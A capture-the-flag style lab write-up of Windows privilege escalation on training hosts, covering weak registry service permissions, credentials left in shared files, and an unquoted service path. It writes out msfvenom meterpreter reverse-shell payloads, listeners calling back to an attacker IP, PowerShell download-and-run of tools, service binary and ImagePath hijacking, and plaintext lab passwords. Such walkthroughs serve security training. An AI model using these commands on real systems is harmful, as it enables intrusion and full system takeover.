---
date: 2025-01-19
categories: [CTF, IML]
title: "IML - Privilege Escalation: Windows – Demonstrate Your Skills"
tags: ['privilege escalation', 'rce', 'reverse shell', 'windows']

description: "Privilege Escalation Windows - A walkthrough of the challenge with enumeration, exploitation and privilege escalation steps."
---

---
---

# IML - Privilege Escalation: Windows – Demonstrate Your Skills


![image1](../resources/7a304a995386414aa0eeb7ca971bdfce.png)

```bash
xfreerdp /v:10.102.88.102 /u:teddy /p:burger /dynamic-resolution

```
**<u>Weak Registry Permissions</u>**

- Upload WinPEAS

Found:


![image2](../resources/de764fd4ad864270841fa567ae1509dc.png)


![image3](../resources/845fed01b4384d938ef0489ab71d375c.png)

- Can also check manullay with:
Upload accesschk64.exe

```bash
(new-object System.Net.WebClient).DownloadFile('http://10.102.155.66:8080/accesschk64.exe',' C:\Users\teddy\accesschk64.exe')
.\accesschk64.exe #Run this first and agree to the terms
.\accesschk64.exe -kw hklm\System\CurrentControlSet\Services | Select-String -Pattern "teddy" -Context 1,3

```

![image4](../resources/01a177b5a2704990a3362fa35c2629b8.png)

```bash
reg query HKLM\system\currentcontrolset\services\InstallerService /s /v imagepath

```

![image5](../resources/9f921983d65e4456bf900f039f266305.png)

```bash
Get-Acl -Path HKLM:system\currentcontrolset\services\InstallerService | format-list

```

![image6](../resources/29dc29ab4de04e319c662bd0ad53f96d.png)

```bash
$acl = get-acl HKLM:system\currentcontrolset\services\InstallerService

ConvertFrom-SddlString -Sddl $acl.Sddl | Foreach-Object {$_.DiscretionaryAcl}

```

![image7](../resources/e693a609ebc8468e93c025fcde5ca396.png)

- Create payload
```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.102.155.66 LPORT=4445 -f exe -o reverse.exe

```
- Set up listener
```bash
msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter_reverse_tcp; set lhost 10.102.155.66; set lport 4445; exploit"

```
- Copy reverse payload over:
```bash
(new-object System.Net.WebClient).DownloadFile('http://10.102.155.66:8080/reverse.exe',' C:\Users\teddy\reverse.exe')

```
- Modifying The Registry "InstallerService"

We will now modify the ImagePath value for the InstallerService registry and set it as the path of the custom executable "reverse.exe"

```bash
reg add "HKLM\system\currentcontrolset\services\InstallerService" /t REG_EXPAND_SZ /v ImagePath /d C:\Users\teddy\reverse.exe" /f

```

![image8](../resources/ff5f4374191842878cdde90475b9b0a4.png)

```bash
whoami /all

```

![image9](../resources/363deb1fbd6a450db6630a5640c756bd.png)

User has the **SeShutdownPrivilege** - So we can restart the machine, which will restart the service:

```bash
shutdown /r /t 0

```
Got SYSTEM shell


![image10](../resources/32f3b39d7e4c438bab3c9f6a7ba146ef.png)

- More stable shell:
```bash
ps

migrate <ps number>

```

![image11](../resources/e8f949c517354612b93061fa2bb65d1a.png)


![image12](../resources/18f4c639c9f44123b8dfa8ff45f14238.png)

**DefaultUserAccount : U8WXLhuAVQs25f7R**

**<u>Stolen Credentials</u>**


![image13](../resources/b066c87be9984451807c42b606df997a.png)

```bash
xfreerdp /v:10.102.188.254 /u:DefaultUserAccount /p:U8WXLhuAVQs25f7R /dynamic-resolution

```
- Upload WinPEAS:
```bash
(new-object System.Net.WebClient).DownloadFile('http://10.102.155.66:8080/winPEAS.exe',' C:\Users\DefaultUserAccount\winPEAS.exe')

```

![image14](../resources/8e0cd5a5855a4e5688341e804a62574d.png)


![image15](../resources/71f674f6c0cb4476a7d3f1c2215ed1b1.png)


![image16](../resources/1916f8cd44f8436280b1a47c8b6776cc.png)

- We can read files from svcSetup:

C:\Users\svcSetup\My Documents\Shared Documents\Development\ChangePassword\credentials\pass

C:\Users\svcSetup\My Documents\Shared Documents\Development\ChangePassword\credentials\user

- Base64 decode the files:
```bash
echo "c3ZjU2V0dXA=" | base64 -d

echo "U2V0dXAtQWNjb3VudC1QYXNzd29yZC0x" | base64 -d

```

![image17](../resources/987673429cbb4a72afb0cbe186fadfb5.png)

**svcsetup : Setup-Account-Password-1**

- Run cmd as admin - More choices

![image18](../resources/49119e8dc6214447a47755e7a50f386b.png)


![image19](../resources/4aad4d87a441411c8939bc62ca2cbf1c.png)

**rudy : m9R4pvrRjgFk**

**<u>Unquoted Service Path</u>**


![image20](../resources/f507169bc8e04cc4a6871e7637849d03.png)

```bash
xfreerdp /v:10.102.131.27 /u:rudy /p:m9R4pvrRjgFk /dynamic-resolution

```
- Upload WinPEAS
```bash
(new-object System.Net.WebClient).DownloadFile('http://10.102.155.66:8080/winPEAS.exe',' C:\Users\rudy\winPEAS.exe')

```

![image21](../resources/636a6a6d1b734248bae0d3f1296058fd.png)

NewUpdaterService(NewUpdaterService)\[**C:\Program Files\Dev Builds\New Updater Service\Automatic Updater.exe**\] - Auto - Running - isDotNet - No quotes and Space detected

File Permissions: rudy \[AllAccess\]


Possible DLL Hijacking in binary folder: **C:\Program Files\Dev Builds\New Updater Service** (rudy \[AllAccess\])

- Manually Check for Services:
```bash
Get-WmiObject -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where { $_.PathName -notlike "C:\Windows\*" } | select Name,DisplayName,StartMode,PathName

```

![image22](../resources/06cc989c0b3e4f4ca7e7e5ec48464c53.png)

- Enumerate the system architecture before uploading tools:
```bash
systeminfo | findstr /B /C:"Host Name" /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Hotfix(s)"

```

![image23](../resources/ae5e9cbce60f459b9b4b4fe3aa048d34.png)

- Upload accesschk
```bash
(new-object System.Net.WebClient).DownloadFile('http://10.102.155.66:8080/accesschk64.exe',' C:\Users\rudy\accesschk64.exe')

```
- With accesschk on the system, we want to enumerate the permissions on the service folder:

```bash
.\accesschk64.exe -wvud "C:\Program Files\Dev Builds\New Updater Service" -accepteula

```

![image24](../resources/6cc1cebb05724c189bfc86c191c16af6.png)

Rudy has FILE_ALL_ACCESS on this folder

- Create payload
```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.102.155.66 LPORT=5555-f exe -o "Automatic Updater.exe"

```
- Set up listener
```bash
msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter_reverse_tcp; set lhost 10.102.155.66; set lport 5555; exploit"

```
- Upload reverse shell
```bash
(new-object System.Net.WebClient).DownloadFile('http://10.102.155.66:8080/"Automatic Updater.exe"',' C:\Users\rudy\\Automatic Updater.exe"')

```
- Rename the original
```bash
mv C:\Program Files\Dev Builds\New Updater Service\Automatic Updater.exe C:\Program Files\Dev Builds\New Updater Service\Automatic.bak

```
- Move the malicious file into the original folder
```bash
mv ".\Automatic Updater.exe" "C:\Program Files\Dev Builds\New Updater Service"
```

```bash
shutdown /r /t 0 #Because we have the SeShutdown Privilege
```

Got shell

![image25](../resources/60a056233748485a912c1e04cfa98ab2.png)

- More stable shell:
```bash
ps

migrate <ps number>
```

![image26](../resources/213cd56da6394d239272c9225e743d06.png)